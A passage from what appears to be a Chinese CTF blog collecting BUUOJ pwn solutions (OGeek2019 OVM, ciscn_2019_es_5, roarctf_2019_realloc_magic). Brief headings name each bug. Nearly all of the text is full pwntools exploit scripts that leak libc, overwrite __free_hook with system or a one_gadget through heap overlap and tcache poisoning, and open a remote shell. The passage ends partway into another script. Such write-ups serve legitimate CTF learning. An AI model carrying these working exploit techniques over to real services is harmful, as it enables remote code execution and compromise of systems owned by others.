realloc(0,'')</span><br><span class="line">    realloc(0x88,p64(0xfbad1800) + p64(0) * 3 + "\x00")</span><br><span class="line">    sh.recvuntil(p64(0xfbad1800) + p64(0) * 3)</span><br><span class="line">    libc = u64(sh.recv(8)) - lib.symbols['_IO_2_1_stdout_'] + 0x60</span><br><span class="line">    __free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line">    system = libc + lib.symbols['system']</span><br><span class="line">    free("m")</span><br><span class="line">    realloc(-1,'')</span><br><span class="line">    realloc(0x58,p64(__free_hook))</span><br><span class="line">    realloc(-1,'')</span><br><span class="line">    realloc(0x58,p64(__free_hook))</span><br><span class="line">    realloc(-1,'')</span><br><span class="line">    realloc(0x58,p64(system))</span><br><span class="line">    free("c")</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    pwn("node2.buuoj.cn.wetolink.com",28993,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x65-OGeek2019-Final-OVM"><a href="#0x65-OGeek2019-Final-OVM" class="headerlink" title="0x65 [OGeek2019 Final]OVM"></a>0x65 [OGeek2019 Final]OVM</h2><h3 id="数组越界-VM-Pwn"><a href="#数组越界-VM-Pwn" class="headerlink" title="数组越界 + VM Pwn"></a>数组越界 + VM Pwn</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ovm")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">time = 0.1</span><br><span class="line">def sendCode(num):</span><br><span class="line">    sleep(time)</span><br><span class="line">    sh.sendline(str(num))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        sh = process("./ovm")</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">        one_gadget = [0x4f2c5,0x4f322,0x10a38c]</span><br><span class="line">    else:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">        lib = ELF("libc-2.23.so")</span><br><span class="line">        one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]</span><br><span class="line">    #integer overflow 0x400F8 / 0x4 = 0x1003E = 0xFFFFFFC2</span><br><span class="line">    read_offset = lib.symbols['read']</span><br><span class="line">    __free_hook_offset = lib.symbols['__free_hook']</span><br><span class="line">    system_offset = lib.symbols['system']</span><br><span class="line">    offset1 = __free_hook_offset - read_offset</span><br><span class="line">    opcode = [</span><br><span class="line">            0x100D0000,</span><br><span class="line">            0x10010001,</span><br><span class="line">            0x700D010D,</span><br><span class="line">            0x10010008,</span><br><span class="line">            0xC00D0D01,</span><br><span class="line">            0xC00D0D01,</span><br><span class="line">            0x1001003E,</span><br><span class="line">            0x700D010D,</span><br><span class="line">            0x10010000,</span><br><span class="line">            0x800D010D,</span><br><span class="line">            0x60030000,</span><br><span class="line">            0x60040000,</span><br><span class="line">            0x10020008,</span><br><span class="line">            0x10010000 + ((offset1 >> 8) % 0x100),</span><br><span class="line">            0x10060000 + (offset1 >> 16),</span><br><span class="line">            0xC0060602,</span><br><span class="line">            0x70060106,</span><br><span class="line">            0xC0060602,</span><br><span class="line">            0x10010000 + (offset1 % 0x100),</span><br><span class="line">            0x70060106,</span><br><span class="line">            0x70050406,</span><br><span class="line">            0x10070008,</span><br><span class="line">            0x80070807,</span><br><span class="line">            0x40050007,</span><br><span class="line">            0x10070007,</span><br><span class="line">            0x80070807,</span><br><span class="line">            0x40030007,</span><br><span class="line">            0xFF000000</span><br><span class="line">            ]</span><br><span class="line">    sh.sendlineafter("PCPC:","0")</span><br><span class="line">    sh.sendlineafter("SP:","0")</span><br><span class="line">    sh.sendlineafter("CODE SIZE:",str(len(opcode)))</span><br><span class="line">    for i in opcode:</span><br><span class="line">        sendCode(i)</span><br><span class="line">    sh.recvuntil("R3: ")</span><br><span class="line">    read = int(sh.recv(4),16) << 32</span><br><span class="line">    sh.recvuntil("R4: ")</span><br><span class="line">    read = read + int(sh.recvuntil("\nR5:",True),16)</span><br><span class="line">    libc = read - lib.symbols['read'] </span><br><span class="line">    sh.sendafter("HOW DO YOU FEEL AT OVM?",p64(libc + one_gadget[1]))</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        log.success("libc: " + hex(libc))</span><br><span class="line">        log.success("pid: " + str(sh.pid))</span><br><span class="line">        log.success("read_offset: " + hex(read_offset))</span><br><span class="line">        log.success("read: " + hex(read))</span><br><span class="line">        log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">        log.success("__free_hook_offset: " + hex(__free_hook_offset))</span><br><span class="line">        log.success("__free_hook_offset - read_offset: " + hex(offset1))</span><br><span class="line">        log.success("system_offset: " + hex(system_offset))</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    pwn("node2.buuoj.cn.wetolink.com",28625,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x66-ciscn-2019-es-5"><a href="#0x66-ciscn-2019-es-5" class="headerlink" title="0x66 ciscn_2019_es_5"></a>0x66 ciscn_2019_es_5</h2><h3 id="0堆块和realloc函数之前的冲突导致double-free"><a href="#0堆块和realloc函数之前的冲突导致double-free" class="headerlink" title="0堆块和realloc函数之前的冲突导致double free"></a>0堆块和realloc函数之前的冲突导致double free</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_es_5")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def add(size,content):</span><br><span class="line">    sh.sendlineafter("Your choice:","1")</span><br><span class="line">    sh.sendlineafter(">",str(size))</span><br><span class="line">    if(size != 0):</span><br><span class="line">        sh.sendafter(":",content)</span><br><span class="line">def edit(idx,content):</span><br><span class="line">    sh.sendlineafter("Your choice:","2")</span><br><span class="line">    sh.sendlineafter(":",str(idx))</span><br><span class="line">    if(content != ''):</span><br><span class="line">        sh.sendafter(":",content)</span><br><span class="line">def free(idx):</span><br><span class="line">    sh.sendlineafter("Your choice:","4")</span><br><span class="line">    sh.sendlineafter(":",str(idx))</span><br><span class="line">def show(idx):</span><br><span class="line">    sh.sendlineafter("Your choice:","3")</span><br><span class="line">    sh.sendlineafter(":",str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        sh = process("./ciscn_2019_es_5")</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    else:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    add(0x0,'')</span><br><span class="line">    add(0xb0,'\n')</span><br><span class="line">    edit(0,'')</span><br><span class="line">    free(0)</span><br><span class="line">    add(0x18,'a')</span><br><span class="line">    show(0)</span><br><span class="line">    sh.recvuntil("Content: ")</span><br><span class="line">    heap_base = (u64(sh.recvuntil("\n",True).ljust(8,'\x00')) >> 12) << 12</span><br><span class="line">    edit(0,p64(heap_base + 0xa0))</span><br><span class="line">    add(0x18,p64(heap_base + 0x10))</span><br><span class="line">    payload = p64(0xfcfcfcfcfcfcfcfc) * 8 + p64(0) * ((0xb0 - 0x58) / 8) + p64(heap_base+0x10)</span><br><span class="line">    add(0xb0,payload)</span><br><span class="line">    free(1)</span><br><span class="line">    add(0x0,'')</span><br><span class="line">    show(1)</span><br><span class="line">    libc = u64(sh.recvuntil("\x7f",False)[-6:].ljust(8,'\x00')) - 96 - lib.symbols['__malloc_hook'] - 0xc0</span><br><span class="line">    __free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line">    system = libc + lib.symbols['system']</span><br><span class="line">    payload = p64(0xfcfcfcfcfcfcfcfc) * 8 + p64(0) * ((0xb0 - 0x58) / 8) + p64(__free_hook) + p64(__free_hook + 8)</span><br><span class="line">    add(0xc0,payload)</span><br><span class="line">    add(0xc0,p64(system))</span><br><span class="line">    add(0xd0,'/bin/sh\x00')</span><br><span class="line">    free(6)</span><br><span class="line">    log.success("libc: " + hex(libc))</span><br><span class="line">    log.success("system: " + hex(system))</span><br><span class="line">    log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">    log.success("heap_base: " + hex(heap_base))</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        log.success("pid: " + str(sh.pid))</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    pwn("node2.buuoj.cn.wetolink.com",28899,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x67-roarctf-2019-realloc-magic"><a href="#0x67-roarctf-2019-realloc-magic" class="headerlink" title="0x67 roarctf_2019_realloc_magic"></a>0x67 roarctf_2019_realloc_magic</h2><h3 id="realloc可以实现堆重叠，然后覆盖fd低位为tcache头，然后控制到tcache头，造出libc地址，然后覆盖低位地址为stdout，然后覆盖数据实现libc-leak，然后执行magic清空指针，然后申请堆块回到tcache头，通过tcache-attack控制free-hook-8的地址数据为-bin-sh-x00，然后向下覆盖free-hook地址为system，然后直接free就可以拿到shell。"><a href="#realloc可以实现堆重叠，然后覆盖fd低位为tcache头，然后控制到tcache头，造出libc地址，然后覆盖低位地址为stdout，然后覆盖数据实现libc-leak，然后执行magic清空指针，然后申请堆块回到tcache头，通过tcache-attack控制free-hook-8的地址数据为-bin-sh-x00，然后向下覆盖free-hook地址为system，然后直接free就可以拿到shell。" class="headerlink" title="realloc可以实现堆重叠，然后覆盖fd低位为tcache头，然后控制到tcache头，造出libc地址，然后覆盖低位地址为stdout，然后覆盖数据实现libc leak，然后执行magic清空指针，然后申请堆块回到tcache头，通过tcache attack控制free_hook - 8的地址数据为/bin/sh\x00，然后向下覆盖free_hook地址为system，然后直接free就可以拿到shell。"></a>realloc可以实现堆重叠，然后覆盖fd低位为tcache头，然后控制到tcache头，造出libc地址，然后覆盖低位地址为stdout，然后覆盖数据实现libc leak，然后执行magic清空指针，然后申请堆块回到tcache头，通过tcache attack控制<strong>free_hook - 8的地址数据为/bin/sh\x00，然后向下覆盖</strong>free_hook地址为system，然后直接free就可以拿到shell。</h3><h3 id="非预期：另外可以使用超大堆块漏洞来实现控制tcache头，但是方法较上面方法复杂，且使用存在使用条件（目标靶机必须要有足够大的内存，如果靶机内存很小，还有另一种非预期解，此方法针对可以申请大内存块的靶机），所以我一开始使用非预期解打BUUOJ平台的时候，发现打不通，但是本地却可以打通，应该也是内存申请过大的原因导致的。"><a href="#非预期：另外可以使用超大堆块漏洞来实现控制tcache头，但是方法较上面方法复杂，且使用存在使用条件（目标靶机必须要有足够大的内存，如果靶机内存很小，还有另一种非预期解，此方法针对可以申请大内存块的靶机），所以我一开始使用非预期解打BUUOJ平台的时候，发现打不通，但是本地却可以打通，应该也是内存申请过大的原因导致的。" class="headerlink" title="非预期：另外可以使用超大堆块漏洞来实现控制tcache头，但是方法较上面方法复杂，且使用存在使用条件（目标靶机必须要有足够大的内存，如果靶机内存很小，还有另一种非预期解，此方法针对可以申请大内存块的靶机），所以我一开始使用非预期解打BUUOJ平台的时候，发现打不通，但是本地却可以打通，应该也是内存申请过大的原因导致的。"></a>非预期：另外可以使用超大堆块漏洞来实现控制tcache头，但是方法较上面方法复杂，且使用存在使用条件（目标靶机必须要有足够大的内存，如果靶机内存很小，还有另一种非预期解，此方法针对可以申请大内存块的靶机），所以我一开始使用非预期解打BUUOJ平台的时候，发现打不通，但是本地却可以打通，应该也是内存申请过大的原因导致的。</h3><h3 id="Ubuntu18"><a href="#Ubuntu18" class="headerlink" title="Ubuntu18"></a>Ubuntu18</h3><h3 id="常规解"><a href="#常规解" class="headerlink" title="常规解"></a>常规解</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("roarctf_2019_realloc_magic")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        sh = process("./roarctf_2019_realloc_magic")</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    else:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    def realloc(size,content):</span><br><span class="line">        sh.sendlineafter(">>","1")</span><br><span class="line">        sh.sendlineafter("?",str(size))</span><br><span class="line">        sh.sendafter("?",content)</span><br><span class="line">    def free():</span><br><span class="line">        sh.sendlineafter(">>","2")</span><br><span class="line">    def magic():</span><br><span class="line">        sh.sendlineafter(">>","666")</span><br><span class="line">    def Debug():</span><br><span class="line">        if(debug == 1):</span><br><span class="line">            log.success("pid: " + str(sh.pid))</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    realloc(0x100,'\x11' * 0x100)</span><br><span class="line">    free()</span><br><span class="line">    realloc(0x48,'\x12' * 0x48)</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    realloc(0xB8,'\x13' * 0xB8)</span><br><span class="line">    free()</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    realloc(0x200,'\x14' * 0x200)</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    payload = '\x15' * 0x48 + p64(0xC1) + p16(0x7010)</span><br><span class="line">    realloc(0x100,payload)</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    realloc(0xb8,'\x16' * 0xb8)</span><br><span class="line">    realloc(0x38,'\x17' * 0x38)</span><br><span class="line">    realloc(0,"")</span><br><span class="line">    payload  = p64(0xffffffffffffffff - 7) * 8</span><br><span class="line">    payload += p64(0) * 6 + p64(0x7010)</span><br><span class="line">    realloc(0xb8,payload)</span><br><span class="line">    payload = p64(0)  </span><br><span class="line">    realloc(0x68,payload)</span><br><span class="line">    payload = p64(0) * 8</span><br><span class="line">    payload += p64(0) * 6 + p16(0x7758)</span><br><span class="line">    realloc(0x168,payload)</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    payload = p64(0) + p64(0xfbad1800) + p64(0) * 3 + chr(0)</span><br><span class="line">    realloc(0x78,payload)</span><br><span class="line">    sh.recvuntil(payload[0:len(payload)-1],timeout = 1)</span><br><span class="line">    libc = u64(sh.recv(8)) - 128 - lib.symbols['_IO_2_1_stderr_']</span><br><span class="line">    system = libc +lib.symbols['system']</span><br><span class="line">    binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">    __free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line">    __malloc_hook = libc + lib.symbols['__malloc_hook']</span><br><span class="line">    magic()</span><br><span class="line">    payload  = p64(0) * 8</span><br><span class="line">    payload += p64(__free_hook - 8)</span><br><span class="line">    realloc(0x168,payload)</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    realloc(18,'/bin/sh\x00' + p64(system))</span><br><span class="line">    free()</span><br><span class="line">    log.success("system: " + hex(system))</span><br><span class="line">    log.success("binsh: " + hex(binsh))</span><br><span class="line">    log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">    log.success("__malloc_hook: " + hex(__malloc_hook))    </span><br><span class="line">    log.success("libc: " + hex(libc))</span><br><span class="line">    Debug()</span><br><span class="line">    sh.interactive()</span><br><span class="line">    return True</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    #pwn("node3.buuoj.cn",28913,1)</span><br><span class="line">    while(1):</span><br><span class="line">        try:</span><br><span class="line"></span><br><span class="line">            if(pwn("node3.buuoj.cn",28164,0) == True):</span><br><span class="line">                break</span><br><span class="line">        except EOFError:</span><br><span class="line">            sh.close()</span><br><span class="line">            continue</span><br></pre></td></tr></tbody></table></figure></div><h3 id="Ubuntu18-1"><a href="#Ubuntu18-1" class="headerlink" title="Ubuntu18"></a>Ubuntu18</h3><h3 id="非常规解"><a href="#非常规解" class="headerlink" title="非常规解"></a>非常规解</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("roarctf_2019_realloc_magic")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        sh = process("./roarctf_2019_realloc_magic")</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    else:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    def realloc(size,content):</span><br><span class="line">        sh.sendlineafter(">>","1")</span><br><span class="line">        sh.sendlineafter("?",str(size))</span><br><span class="line">        sh.sendafter("?",content)</span><br><span class="line">    def free():</span><br><span class="line">        sh.sendlineafter(">>","2")</span><br><span class="line">    def magic():</span><br><span class="line">        sh.sendlineafter(">>","666")</span><br><span class="line">    def Debug():</span><br><span class="line">        if(debug == 1):</span><br><span class="line">            log.success("pid: " + str(sh.pid))</span><br><span class="line">        input()</span><br><span class="line">            #x/5gx 0x555555554000+0x202058</span><br><span class="line">    max_size = -0x1</span><br><span class="line">    realloc(0x80,'\x11' * 0x80)</span><br><span class="line">    free()</span><br><span class="line">    realloc(0x100,'\x12' * 0x100)</span><br><span class="line">    free()</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    realloc(0x80,p16(0x7010))</span><br><span class="line">    realloc(max_size,'\n')</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    realloc(0x110,p16(0x7010))</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    realloc(0x100,p16(0x7010))</span><br><span class="line">    realloc(max_size,'\n')</span><br><span class="line">    #Debug()</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    realloc(0x80,p16(0x7010))</span><br><span class="line">    realloc(max_size,'\n')</span><br><span class="line">    payload  = p64(0xffffffffffffffff - 7) * 8</span><br><span class="line">    payload += p64(0) * 16 + p16(0x7010)</span><br><span class="line">    realloc(0x100,payload)</span><br><span class="line">    free()</span><br><span class="line">    realloc(0x80,'\n')</span><br><span class="line">    payload  = p64(0) * 8</span><br><span class="line">    payload += p64(0) * 11 + p16(0x7758)# + chr(0xdd)</span><br><span class="line">    realloc(0x200,payload)</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    payload = p64(0) + p64(0xfbad1800) + p64(0) * 3 + chr(0)</span><br><span class="line">    realloc(0xc0,payload)</span><br><span class="line">    sh.recvuntil(payload[0:len(payload)-1],timeout = 3)</span><br><span class="line">    libc = u64(sh.recv(8)) - 128 - lib.symbols['_IO_2_1_stderr_']</span><br><span class="line">    system = libc +lib.symbols['system']</span><br><span class="line">    binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">    __free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line">    __malloc_hook = libc + lib.symbols['__malloc_hook']</span><br><span class="line">    magic()</span><br><span class="line">    payload = p64(0) * 8</span><br><span class="line">    payload += p64(__free_hook - 8)</span><br><span class="line">    realloc(0x118,payload)</span><br><span class="line">    realloc(0,'') </span><br><span class="line">    realloc(0x18,"/bin/sh\x00" + p64(system))</span><br><span class="line">    free()</span><br><span class="line">    log.success("system: " + hex(system))</span><br><span class="line">    log.success("binsh: " + hex(binsh))</span><br><span class="line">    log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">    log.success("__malloc_hook: " + hex(__malloc_hook))    </span><br><span class="line">    log.success("libc: " + hex(libc))</span><br><span class="line">    sh.interactive()</span><br><span class="line">    return True</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    #pwn("node3.buuoj.cn",28913,0)</span><br><span class="line">    while(1):</span><br><span class="line">        try:</span><br><span class="line">            if(pwn("node3.buuoj.cn",28460,0) == True):#"node3.buuoj.cn",28460</span><br><span class="line">                break</span><br><span class="line">        except EOFError:</span><br><span class="line">            sh.close()</span><br><span class="line">            continue</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x68-roarctf-2019-easy-pwn"><a href="#0x68-roarctf-2019-easy-pwn" class="headerlink" title="0x68 roarctf_2019_easy_pwn"></a>0x68 roarctf_2019_easy_pwn</h2><h3 id="堆块重叠即可"><a href="#堆块重叠即可" class="headerlink" title="堆块重叠即可"></a>堆块重叠即可</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 